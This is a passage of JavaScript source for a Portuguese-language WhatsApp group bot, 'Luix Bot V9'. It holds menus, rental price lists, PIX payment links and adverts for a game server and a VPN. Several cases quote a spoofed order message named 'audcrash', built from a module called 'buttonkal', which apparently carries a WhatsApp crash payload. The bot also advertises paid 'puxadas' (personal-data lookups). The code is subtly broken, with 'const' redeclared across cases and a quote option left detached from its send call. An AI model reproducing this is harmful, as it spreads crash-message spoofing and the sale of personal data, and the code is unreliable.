`${prefix}brincadeiras`, buttonText: {displayText: `『💞』✰͜͡𝐌𝐄𝐍𝐔-𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒`}, type: 1}, 
{buttonId: `${prefix}menuadm`, buttonText: {displayText: `『🔎』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐃𝐌𝐈𝐍`}, type: 1},
{buttonId: `${prefix}menulogos`, buttonText: {displayText: `『🖼』✰͜͡𝐌𝐄𝐍𝐔-𝐋𝐎𝐆𝐎𝐒`}, type: 1}]

const buttonMessage = {
    image: {url: `${logo}`},
    caption: menulogos(prefix, NomeDoBot, {quoted: selo}),
    footer: 'ⓘ Esse usuário é um bot  𝙎𝙖𝙞𝙗𝙖 𝙢𝙖𝙞𝙨',
    buttons: buttons,
    headerType: 4,
    contextInfo: {"externalAdReply":{
    title: `${tempo}, ${pushname} ☺️🧙‍♂️`,
    mediaType: 1,
    renderLargerThumbnail: false,
    showAdAttribution: true,
    body: `${NomeDoBot}`,
    thumbnail: fs.readFileSync('./luixft.jpg'),
    mediaUrl: `https://mega.nz/file/gepQwZ7K#rDgTvzQcbruM9qxIW8d1lp3oBirBfLPsbDsTL2QQn2E`,
    sourceUrl: `https://mega.nz/file/gepQwZ7K#rDgTvzQcbruM9qxIW8d1lp3oBirBfLPsbDsTL2QQn2E`,
    headerType: 4
}}
}
conn.sendMessage(from, buttonMessage, {quoted: selo})
}
/*sendBimg(from, `${logo}`, menulogos(prefix), "Leia com atenção", [
{buttonId: `${prefix}alugar`, buttonText: {displayText: `『💸』❥͜𝐀𝐋𝐔𝐆𝐀𝐑 𝐁𝐎𝐓`}, type: 1}, {buttonId: `${prefix}menulista`, buttonText: {displayText: `『⚔️』❥͜𝐌𝐄𝐍𝐔-𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋`}, type: 1}, {buttonId: `${prefix}menupuxas`, buttonText: {displayText: `『🔎』️𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀𝐒`}, type: 1}], selo)
*/
break

case "antis":{
if (!isGroupAdmins) return reply ('👻 ᏙϴᏟᎬ̂ ΝᎬᎷ Ꭼ́ ᎪᎠᎷ\nΝᎪ̃ϴ ᏢᎡᎬᏟᏆՏᎪ ᏙᎬᎡ ᎬՏͲᎬ ᎷᎬΝႮ')
const sections = [
    {
	title: "🔗𝐀𝐍𝐓𝐈 𝐋𝐈𝐍𝐊🔗",
	rows: [
	    {title: `𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊🔗`, rowId: `${prefix}antilink56 1`},
	    {title: `𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊🔗`, rowId: `${prefix}antilink56 0`,}
	]
    },
   {
	title: `𝐀𝐍𝐓𝐈 𝐀𝐔𝐃𝐈𝐎💽️`,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐀𝐔𝐃𝐈𝐎💽", rowId: `${prefix}antiaudio 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐀𝐔𝐃𝐈𝐎💽️`, rowId: `${prefix}antiaudio 0`,}
	]
    },
    {
	title: `𝐀𝐍𝐓𝐈 𝐃𝐎𝐂📂`,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐃𝐎𝐂📂", rowId: `${prefix}antidocumento 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐃𝐎𝐂📂`, rowId: `${prefix}antidocumento 0`,}
	]
    },
      {
	title: `𝐀𝐍𝐓𝐈 𝐅𝐀𝐊𝐄❌`,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐅𝐀𝐊𝐄❌", rowId: `${prefix}antifake 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐅𝐀𝐊𝐄❌`, rowId: `${prefix}antifake 0`,}
	]
    },
      {
	title: ` 𝐀𝐍𝐓𝐈 𝐈𝐌𝐆🖼️`,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑  𝐀𝐍𝐓𝐈𝐈𝐌𝐆🖼️", rowId: `${prefix}antiimg 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑  𝐀𝐍𝐓𝐈𝐈𝐌𝐆🖼️`, rowId: `${prefix}antiimg 0`,}
	]
    },
      {
	title: `𝐀𝐍𝐓𝐈 𝐅𝐈𝐆💟`,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐅𝐈𝐆💟", rowId: `${prefix}antisticker 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐅𝐈𝐆💟`, rowId: `${prefix}antiSticker 0`,}
	]
    },
      {
	title: `𝐀𝐍𝐓𝐈 𝐂𝐀𝐓𝐀𝐋𝐎𝐆𝐎🌟 `,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐂𝐀𝐓𝐀𝐋𝐎𝐆𝐎🌟", rowId: `${prefix}anticatalogo 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐂𝐀𝐓𝐀𝐋𝐎𝐆𝐎🌟`, rowId: `${prefix}anticatalogo 0`,}
	]
    },
       {
	title: `𝐀𝐍𝐓𝐈 𝐏𝐀𝐋𝐀𝐕𝐑𝐀𝐎🗣️ `,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐏𝐀𝐋𝐀𝐕𝐑𝐀𝐎🗣️", rowId: `${prefix}antipalavrao 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐏𝐀𝐋𝐀𝐕𝐑𝐀𝐎🗣️  `, rowId: `${prefix}antipalavrao 0`,}
]
},
   {
	title: `𝐀𝐍𝐓𝐈 𝐋𝐎𝐂📌 `,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐋𝐎𝐂📌", rowId: `${prefix}antiloc 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈𝐋𝐎𝐂📌 `, rowId: `${prefix}antiloc 0`,}
	    ]
},
	       {
	title: ` 𝐀𝐍𝐓𝐈 𝐕𝐈𝐃𝐄𝐎🎮  `,
	rows: [
	    {title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐕𝐈𝐃𝐄𝐎🎮", rowId: `${prefix}antivideo 1`},
	    {title: `𝐃𝐄𝐒𝐋𝐈𝐆𝐀𝐑 𝐀𝐍𝐓𝐈 𝐕𝐈𝐃𝐄𝐎🎮`, rowId: `${prefix}antivideo 0`,}
	]
    },
]
const listMessage = {
  text: "♨️ informações de ativação ♨️",
  footer: `${tempo} ${pushname}`,
  title: "╭╼╼╾❲ S T A T U S ❳╼╼╾╮\n│\n│➱ Antiaudio: AntiAudio? \n│➱ Antidocumento: Antidoc ? \n│➱ Antifake: Antifake ? \n│➱ Antiimg: AntiImg? \n│➱ AntiContato AntiCtt ? \n│➱ Antticker: AntiSticker ? \n│➱ Antiligação: Anticall ? \n│➱ AntiPv-Block: AntiPv ? \n│➱ AntilinkHard: AntiLinkHard ? \n│➱ LimiteCaracteres: AntiFlood ? \n│➱ AntiCatalogo: Anticatalogo ? \n│➱ AntiPalavrão: Palavrao ? \n│➱ Antivideo: AntiVid ? \n│➱ AntiLocalização: Antiloc ? \n│➱ Bemvindo: Welkom ? \n│➱ Simih: Simi ? \n│➱ Modo brincadeira: Modobn ? \n│\n╰╼╾❲ NomeDoBot} ❳╼╾╯",
  buttonText: "Menu Lista",
  sections
}

conn.sendMessage(sender, listMessage)

}
break

case 'm':
case 'alugar2':{
const buttons = [
{buttonId: '!menu', buttonText: {displayText: '🌟𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋🌟'}, type: 1},
{buttonId: '!criador', buttonText: {displayText: '💎❥͜𝐂𝐑𝐈𝐀𝐃𝐎𝐑 𝐃𝐎 𝐁𝐎𝐓💎'}, type: 1}
]

const buttonMessage = {
    image: {url: "./luixbt.jpg"},
    caption: `*╔═══❖•ཌ💎🔥ད•❖═══╗*
   *ঔৣ͜͡ீ͜❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗 ू ፝͜❥*
*╚═══❖•ཌ💎🔥ད•❖═══╝*

*[💞]  BOT DE WHATSAPP 24H ON*
*[💞]  SUPORTE 100% DISPONÍVEL*
*[💞]  ORGANIZE SEU GRUPO*
*[💞]  GERENCIE SEU GRUPO*
*[💞]  PROTEJA SEU GRUPO*
*[💞]  DEIXE SEU GRUPO MAIS ANIMADO*

*____________ᬊᬁP L A N O Sᬊᬁ____________*

*[💞] TESTE 1 DIA:* R$ 01,00
*[💞] SEMANAL:* R$ 05,00
*[💞] MENSAL:* R$ 15,00
*[💞] ARQUIVOS:* R$ 30,00
*[💞] PREMIUM* R$ 35,00

*____________ᬊᬁPROTEÇÕESᬊᬁ____________*

*[💞] ANTI-LINK*
*[💞] ANTI-FAKE*
*[💞] ANTI-CONTATO*
*[💞] ANTI-LOCALIZAÇÃO*
*[💞] ANTI-DOCUMENTO*
*[💞] ANTI-VIDEO*
*[💞] ANTI-IMAGEM*
*[💞] ANTI-AUDIO*
*[💞] ANTI-VIEWONCE*

*____________ᬊᬁRECURSOSᬊᬁ____________*
*[💞] CRIAR FIGURINHAS*
*[💞] BAIXAR MÚSICAS*
*[💞] BAIXAR VIDEOS*
*[💞] ABRIR/FECHAR GRUPO COM TIME*
*[💞] BAN & KICK*
*[💞] BRINCADEIRAS*
*[💞] COMANDOS +🔞*
*[💞] FIGURINHAS INTERATIVAS*
*[💞] ÁUDIOS DE AUTO-RESPOSTA*

*____________ᬊᬁCONTRA-TEᬊᬁ____________*
*[⚡] DONO OFICIAL:* *𝐋𝐔𝐈𝐗*
*[⚡] CHAT:* wa.me/5516997357601
*[⚡] INSTA:* @Luixx__mg

*__ᬊᬁঔৣ͜͡ீ͜❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗ू ፝͜❥ᬊᬁ__*
`,
    footer: 'bot criado pelo luix 💎🌟🧙‍♂️',
    buttons: buttons,
    headerType: 4
}

conn.sendMessage(from, buttonMessage)
{quoted: audcrash}
}
break
case 'adm':  
case 'menuadm':
const buttons = [{buttonId:
`${prefix}brincadeiras`, buttonText: {displayText: `『💞』✰͜͡𝐌𝐄𝐍𝐔-𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒`}, type: 1}, 
{buttonId: `${prefix}menuadm`, buttonText: {displayText: `『🔎』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐃𝐌𝐈𝐍`}, type: 1},
{buttonId: `${prefix}menulogos`, buttonText: {displayText: `『🖼』✰͜͡𝐌𝐄𝐍𝐔-𝐋𝐎𝐆𝐎𝐒`}, type: 1}]

const buttonMessage = {
    image: {url: `${logo}`},
    caption: adms(prefix, NomeDoBot, {quoted: selo}),
    footer: 'ⓘ Esse usuário é um bot  𝙎𝙖𝙞𝙗𝙖 𝙢𝙖𝙞𝙨',
    buttons: buttons,
    headerType: 4,
    contextInfo: {"externalAdReply":{
    title: `${tempo}, ${pushname} ☺️🧙‍♂️`,
    mediaType: 1,
    renderLargerThumbnail: false,
    showAdAttribution: true,
    body: `${NomeDoBot}`,
    thumbnail: fs.readFileSync('./luixft.jpg'),
    mediaUrl: `https://mega.nz/file/gepQwZ7K#rDgTvzQcbruM9qxIW8d1lp3oBirBfLPsbDsTL2QQn2E`,
    sourceUrl: `https://mega.nz/file/gepQwZ7K#rDgTvzQcbruM9qxIW8d1lp3oBirBfLPsbDsTL2QQn2E`,
    headerType: 4
}}
}
conn.sendMessage(from, buttonMessage, {quoted: selo})
/*sendBimg(from, `${logo}`, menulogos(prefix), "Leia com atenção", [
{buttonId: `${prefix}alugar`, buttonText: {displayText: `『💸』❥͜𝐀𝐋𝐔𝐆𝐀𝐑 𝐁𝐎𝐓`}, type: 1}, {buttonId: `${prefix}menulista`, buttonText: {displayText: `『⚔️』❥͜𝐌𝐄𝐍𝐔-𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋`}, type: 1}, {buttonId: `${prefix}menupuxas`, buttonText: {displayText: `『🔎』️𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀𝐒`}, type: 1}], selo)
*/
break 


case 'menuefeitos':
case 'efeitos':  
const buttons = [{buttonId:
`${prefix}brincadeiras`, buttonText: {displayText: `『💞』✰͜͡𝐌𝐄𝐍𝐔-𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒`}, type: 1}, 
{buttonId: `${prefix}menuadm`, buttonText: {displayText: `『🔎』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐃𝐌𝐈𝐍`}, type: 1},
{buttonId: `${prefix}menulogos`, buttonText: {displayText: `『🖼』✰͜͡𝐌𝐄𝐍𝐔-𝐋𝐎𝐆𝐎𝐒`}, type: 1}]

const buttonMessage = {
    image: {url: `${logo}`},
    caption: efeitos(prefix, NomeDoBot, {quoted: selo}),
    footer: 'ⓘ Esse usuário é um bot  𝙎𝙖𝙞𝙗𝙖 𝙢𝙖𝙞𝙨',
    buttons: buttons,
    headerType: 4,
    contextInfo: {"externalAdReply":{
    title: `${tempo}, ${pushname} ☺️🧙‍♂️`,
    mediaType: 1,
    renderLargerThumbnail: false,
    showAdAttribution: true,
    body: `${NomeDoBot}`,
    thumbnail: fs.readFileSync('./luixft.jpg'),
    mediaUrl: `https://mega.nz/file/gepQwZ7K#rDgTvzQcbruM9qxIW8d1lp3oBirBfLPsbDsTL2QQn2E`,
    sourceUrl: `https://mega.nz/file/gepQwZ7K#rDgTvzQcbruM9qxIW8d1lp3oBirBfLPsbDsTL2QQn2E`,
    headerType: 4
}}
}
conn.sendMessage(from, buttonMessage, {quoted: selo})
/*sendBimg(from, `${logo}`, menulogos(prefix), "Leia com atenção", [
{buttonId: `${prefix}alugar`, buttonText: {displayText: `『💸』❥͜𝐀𝐋𝐔𝐆𝐀𝐑 𝐁𝐎𝐓`}, type: 1}, {buttonId: `${prefix}menulista`, buttonText: {displayText: `『⚔️』❥͜𝐌𝐄𝐍𝐔-𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋`}, type: 1}, {buttonId: `${prefix}menupuxas`, buttonText: {displayText: `『🔎』️𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀𝐒`}, type: 1}], selo)
*/
break 
case 'mebnuplanos':
case 'albugar':
case 'plbanos': 
conn.sendMessage(from, { react: { text: `💎`, key: info.key }})
sendBimg(from, `${logo}`, adms(prefix), `☂️`, [
{buttonId: `${prefix}qrcode`, buttonText: {displayText: `⚡️ PIX QR CODE ️`}, type: 1}, {buttonId: `${prefix}dono`, buttonText: {displayText: `💫 INFORMAÇÕES DO DONO`}, type: 1}], selo) 

break

case'alugar': {
const { buttonkal } = require('./armor/funcoes/buttonkal.js')
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: 1397, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
                          let buttonse = [
                    {buttonId: `${prefix}pixprem`, buttonText: {displayText: '『⚔️』𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 '}, type: 1},
                    {buttonId: `${prefix}pix`, buttonText: {displayText: '『⚔️』𝐀𝐋𝐔𝐆𝐀𝐑 𝐆𝐑𝐔𝐏𝐎'}, type: 1},
                    {buttonId: `${prefix}pixpuxas`, buttonText: {displayText: '『⚔️』𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐏𝐔𝐗𝐀𝐃𝐀𝐒'}, type: 1}
]
                let buttonMessagee = {
                    text: `
*╔═══════『💠』═══════╗*
*║* 『🔥』 *✰͜͡CRIADOR:* ❥͜𝐋𝐔𝐈𝐗 〤 𝐌𝐆
*║* 『🔥』 *✰͜͡NOME DO* 𝗕𝗢𝗧: ${NomeDoBot}
*║* 『🔥』 *✰͜͡:SUPORTE* 23Hrs
*║* 『🔥』 *✰͜͡ALUGUEL:* 10,00
*║* 『🔥』 *✰͜͡FORMA DE PAGAMENTO:* PIX
*║* 『🔥』 *✰͜͡PREFIXO:* ${prefix}
*║* 『🔥』 *✰͜͡ATUALIZAÇÃO:* CADA 5 DIAS
*╚═══════『💠』═══════╝*`,
                    footer: `❥͜${NickDono} 𝐃𝐎𝐌𝐈𝐍𝐀⚡`,
                    buttons: buttonse,
                    headerType: 2
                }
                conn.sendMessage(from, buttonMessagee, {quoted: audcrash})
            }
            break
case 'samp': {
const { buttonkal } = require('./armor/funcoes/buttonkal.js')
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: 1397, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
                          let buttonse = [
                    {buttonId: `${prefix}jogosamp`, buttonText: {displayText: '『🎮』𝐁𝐀𝐈𝐗𝐀𝐑 𝐒𝐀𝐌𝐏 '}, type: 1}
]
                let buttonMessagee = {
                    text: `
*╔═════『${NomeDoBot}』═════*
*║* 『☕』 *✰͜͡IP DO SERVIDOR:* 23.88.73.88:11627
*║* 『☕』 *✰͜͡DONO DO SERVIDOR: ${NickDono}*
*║* 『☕』 *✰͜͡COMPRAR VIP:* 5,00 R$
*║* 『☕』 *✰͜͡COMPRAR ADMIN:* 10,00,00 R$
*║* 『☕』 *✰͜͡COMPRAR LIDER:* 15,00 R$
*║* 『☕』 *✰͜͡COMPRAR DINHEIRO:* CADA 1$ É 10K
*║* 『☕』 *✰͜͡FORMA DE PAGAMENTO:* PIX & TED
*╚═════『${NomeDoBot}』═════*`,
                    footer: `❥͜${NickDono} 𝐃𝐎𝐌𝐈𝐍𝐀⚡`,
                    buttons: buttonse,
                    headerType: 2
                }
                conn.sendMessage(from, buttonMessagee, {quoted: selo2})
            }
            break
case 'vpn': {
const { buttonkal } = require('./armor/funcoes/buttonkal.js')
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: 1397, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
                          let buttonse = [
                    {buttonId: `${prefix}criador2`, buttonText: {displayText: '『🚀️』𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐕𝐏𝐍️ '}, type: 1}
]
                let buttonMessagee = {
                    text: `
🇮‌🇳‌🇹‌🇪‌🇷‌🇳‌🇪‌🇹‌ 🇮‌🇱‌🇮‌🇲‌🇮‌🇹‌🇦‌🇩‌🇦‌

『🚀』 *TENHA 30 DIAS DE  INTERNET ILIMITADA*

『✅』*CABE NO SEU BOLSO*

『💥』 *RODANDO TUDO💥*

『⏳』  *TESTE GRÁTIS ⏳*
 
『📡』 *OPERADORAS*
『🔹️』 *️VIVO*
『🔹️』 *️TIM*
『🔹️』 *CLARO*
『🔹️』 *️OI*

『📱』 *1 LOGINS: R$ 20,00*
『📱』 *2 LOGINS: R$ 35,00*
『📱』 *3 LOGINS: R$ 45,00*
`,
                    footer: `✰͜͜͡${NickDono} 𝐃𝐎𝐌𝐈𝐍𝐀👻`,
                    buttons: buttonse,
                    headerType: 2
                }
                conn.sendMessage(from, buttonMessagee, {quoted: selo2})
            }
            break
case 'pixpuxas':    		
conn.sendMessage(sender, {sticker: fs.readFileSync(`./pixgratis.webp`)}, {quoted: selo});

img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(sender,{image:img,caption: `
『💠』𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐏𝐔𝐗𝐀𝐃𝐀𝐒
『💸』 *Valor: R$7,50*
『🕑』 *Tempo de duração: 30 minutos*
『⌛』 *${tempo}, ${pushname}.*
『🔗』 *Link para pagamento:*
https://nubank.com.br/pagar/12zc0i/Iqm7LafO5v
`}, {quoted: selo}) 
reply('*Gerando pix QR Code & Inviando no seu pv...* 💫')    		
break

case 'pixprem':    		
conn.sendMessage(sender, {sticker: fs.readFileSync(`./pixgratis.webp`)}, {quoted: selo});

img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(sender,{image:img,caption: `
『💠』𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐏𝐑𝐄𝐌𝐈𝐔𝐌
『💸』 *Valor: R$2,50*
『🕑』 *Tempo de duração: 30 minutos*
『⌛』 *${tempo}, ${pushname}.*
『🔗』 *Link para pagamento:*
https://nubank.com.br/pagar/12zc0i/tRe7FJNzr3
`}, {quoted: selo}) 
reply('*Gerando pix QR Code & Inviando no seu pv...* 💫')    		
break
case 'qrcode':
case 'pix':
case 'pixqr':    		
conn.sendMessage(sender, {sticker: fs.readFileSync(`./pixgratis.webp`)}, {quoted: selo});

img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(sender,{image:img,caption: `
『💠』𝐀𝐋𝐔𝐆𝐀𝐑 𝐆𝐑𝐔𝐏𝐎
『💸』 *Valor: R$5*
『🕑』 *Tempo de duração: 30 minutos*
『⌛』 *${tempo}, ${pushname}.*
『🔗』 *Link para pagamento:*
https://nubank.com.br/pagar/12zc0i/ftRsf5abHT
`}, {quoted: selo}) 
reply('*Gerando pix QR Code & Inviando no seu pv...* 💫')    		
break
case 'manutencao':		
conn.sendMessage(from, { react: { text: `🛠️`, key: info.key }})
img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(from,{image:img,caption: `
🤖 | 𝐎 𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗 𝐄𝐒𝐓𝐀 𝐄𝐌 𝐌𝐀𝐍𝐔𝐓𝐄𝐍𝐂𝐀𝐎 𝐀𝐆𝐔𝐀𝐑𝐃𝐄𝐌 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑`})   		
break
case 'alugajr':{
const buttons = [
{buttonId: '!menu', buttonText: {displayText: '🌟𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋🌟'}, type: 1},
{buttonId: '!criador', buttonText: {displayText: '💎❥͜𝐂𝐑𝐈𝐀𝐃𝐎𝐑 𝐃𝐎 𝐁𝐎𝐓💎'}, type: 1}
]

const buttonMessage = {
    image: {url: "./luixbt.jpg"},
    caption: `*╔═══❖•ཌ💎🔥ད•❖═══╗*
   *ঔৣ͜͡ீ͜❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗 ू ፝͜❥*
*╚═══❖•ཌ💎🔥ད•❖═══╝*

*[💞]  BOT DE WHATSAPP 24H ON*
*[💞]  SUPORTE 100% DISPONÍVEL*
*[💞]  ORGANIZE SEU GRUPO*
*[💞]  GERENCIE SEU GRUPO*
*[💞]  PROTEJA SEU GRUPO*
*[💞]  DEIXE SEU GRUPO MAIS ANIMADO*

*____________ᬊᬁP L A N O Sᬊᬁ____________*

*[💞] TESTE 1 DIA:* R$ 01,00
*[💞] SEMANAL:* R$ 05,00
*[💞] MENSAL:* R$ 15,00
*[💞] ARQUIVOS:* R$ 30,00
*[💞] PREMIUM* R$ 35,00

*____________ᬊᬁPROTEÇÕESᬊᬁ____________*

*[💞] ANTI-LINK*
*[💞] ANTI-FAKE*
*[💞] ANTI-CONTATO*
*[💞] ANTI-LOCALIZAÇÃO*
*[💞] ANTI-DOCUMENTO*
*[💞] ANTI-VIDEO*
*[💞] ANTI-IMAGEM*
*[💞] ANTI-AUDIO*
*[💞] ANTI-VIEWONCE*

*____________ᬊᬁRECURSOSᬊᬁ____________*
*[💞] CRIAR FIGURINHAS*
*[💞] BAIXAR MÚSICAS*
*[💞] BAIXAR VIDEOS*
*[💞] ABRIR/FECHAR GRUPO COM TIME*
*[💞] BAN & KICK*
*[💞] BRINCADEIRAS*
*[💞] COMANDOS +🔞*
*[💞] FIGURINHAS INTERATIVAS*
*[💞] ÁUDIOS DE AUTO-RESPOSTA*

*____________ᬊᬁCONTRA-TEᬊᬁ____________*
*[⚡] DONO OFICIAL:* *𝐋𝐔𝐈𝐗*
*[⚡] CHAT:* wa.me/5516997357601
*[⚡] INSTA:* @Luixx__mg

*__ᬊᬁঔৣ͜͡ீ͜❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗ू ፝͜❥ᬊᬁ__*
`,
    footer: 'bot criado pelo luix 💎🌟🧙‍♂️',
    buttons: buttons,
    headerType: 4
}

conn.sendMessage(from, buttonMessage)
{quoted: audcrash}
}
break

case "dono":{
const buttons = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '🌟𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋🌟'}, type: 1}
]

const buttonMessage = {
    image: {url: "./luixbt.jpg"},
    caption: `
╔══❖•ೋ°ৡৢ͜͡ 👻𖥨֗°ೋ•❖══╗
║    ⛦⸸ 𝐈 𝐍 𝐅 𝐎 𝐃 𝐎 𝐍 𝐎 ⸸⛦
╠══❖•ೋ°ৡৢ͜͡ 👻𖥨֗°ೋ•❖══╝
║
║ *⛦ۣ𝑵𝑰𝑪𝑲 𝐃𝐎𝐍𝐎 ->『 ${NickDono}』*
║
║ *⛦ۣ𝐖𝐇𝐀𝐓𝐒 ->『 wa.me/${setting.numerodono} 』*
║
║ *⛦ۣ𝑷𝑹𝑬𝑭𝑰𝑿𝑶 𝑫𝑶 𝑩𝑶𝑻 ->『 ${prefix} 』*
║                                              
║ *⛦ۣ𝑵𝑶𝑴𝑬 𝑫𝑶 𝑩𝑶𝑻 ->『 ${NomeDoBot} 』* 
║                                  
╚══❖•ೋ°ৡৢ͜͡ 👻𖥨֗°ೋ•❖══╝
`,
    footer: `${NickDono}`,
    buttons: buttons,
    headerType: 4
}
conn.sendMessage(from, buttonMessage, {quoted: selo})
}
break

case 'infodn':
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(from,{image:img,caption: `
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╗
║     ᬊ᭄𝐈𝐍𝐅𝐎/𝐃𝐎𝐍𝐎ᬊ᭄
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╝
║𖢼⩺ ${prefix}Fotomenu (MARCAR-IMG) 
║𖢼⩺ ${prefix}audio-menu
║𖢼⩺ ${prefix}verificado-global
║𖢼⩺ ${prefix}console
║𖢼⩺ ${prefix}botoes
║𖢼⩺ ${prefix}InfoBemvindo
║𖢼⩺ ${prefix}Infopalavrão
║𖢼⩺ ${prefix}Infolistanegra
║𖢼⩺ ${prefix}Infobancarac
║𖢼⩺ ${prefix}Infovotação
║𖢼⩺ ${prefix}Infocontador
║𖢼⩺ ${prefix}Infosorteio
`}, {quoted: selo})     		
break
case 'dolar':
try {
if(!q) return reply("Coloque o preço")
keysupra = "lhannabot"
a = await fetchJson(`https://supraz.herokuapp.com/api/dolares?quantia=${q}&apikey=${keysupra}`)
reply(`Olá ${pushname}\n\n${q} DOLARES CUSTA\n\n${a.valor}`)
} catch(e) {
reply("desculpe mas não achei o que você quer / Ou / A api caiu, em breve volta.")

}

break

case 'basico':
case 'basicos':    		
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(from,{image:img,caption: `
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╗
║         ᬊ᭄𝐂𝐌𝐃𝐒/𝐁𝐀𝐒𝐈𝐂𝐎𝐒ᬊ᭄
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╝
║𖢼⩺ ${prefix}Gtts (LINGUAGEM + TEXTO)
║𖢼⩺ ${prefix}Traduzir Hello 
║𖢼⩺ ${prefix}Tagme 
║𖢼⩺ ${prefix}Emoji
║𖢼⩺ ${prefix}Emojimix
║𖢼⩺ ${prefix}Tabela (LETRAS) 
║𖢼⩺ ${prefix}Conselhobiblico
║𖢼⩺ ${prefix}Simi (FALE-ALGO)  
║𖢼⩺ ${prefix}Perfil
║𖢼⩺ ${prefix}Calcular (1 + 1)
║𖢼⩺ ${prefix}Fazernick (NICK)
║𖢼⩺ ${prefix}Bot
`}, {quoted: selo}) 	
break
case 'h':    		
img = fs.readFileSync('./luixbt.jpg')  

conn.sendMessage(from,{image:img,caption: `
╠══❖•ೋ°ৡৢ͜͡  ❤‍🔥 𖥨֗°ೋ•❖══╗
